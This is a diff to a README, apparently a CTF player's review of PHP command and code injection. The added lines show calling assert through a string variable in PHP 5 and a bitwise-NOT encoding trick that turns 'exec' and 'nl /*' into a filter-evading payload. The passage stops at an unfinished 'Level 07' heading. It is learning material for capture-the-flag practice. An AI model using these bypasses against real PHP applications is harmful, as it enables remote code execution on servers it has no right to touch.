@@ -1,4 +1,4 @@
-My-PHP-Command-Code-Injection-Reivew
+### My-PHP-Command-Code-Injection-Reivew
 
 Have playing CTF for 2 years, seem long but not as much as I think. I have conduct some small experience and technique to build payload and this is about it.
 The resource is plenty if not want to say overwhelming for an individual to find and read all of that and most of it often repeated the same marterial over and over.
@@ -191,3 +191,36 @@ function judge($c)
 }
 
 ```
+
+One more thing:
+PHP 5 and PHP 7 asseet() function is different 
+You can do this in PHP 5 but not in PHP 7 so be careful
+
+<?php
+$x='assert'; //yes string
+echo $x("phpinfo();");
+?>
+
+
+
+
+
+
+### Level 6. Not allow alphabet and number
+This is a bit difficult and will be confuse but often because ascii is not complete, using it is an advantage 
+
+Using reverse bytes to inject. The negative sign is ~, It's also an operator. In the binary representation of numbers, take 0 Turn into 1, take 1 Turn into 0. 
+
+Reverse the string then reverse again in the payload. 
+
+<?php 
+$a = urlencode(~'exec'); 
+echo $a; 
+$b = urlencode(~'nl /*'); 
+echo $b; 
+//(~%9A%87%9A%9C)((~%91%93%DF%D0%D5)); 
+
+
+Level 07. Some 
+
+
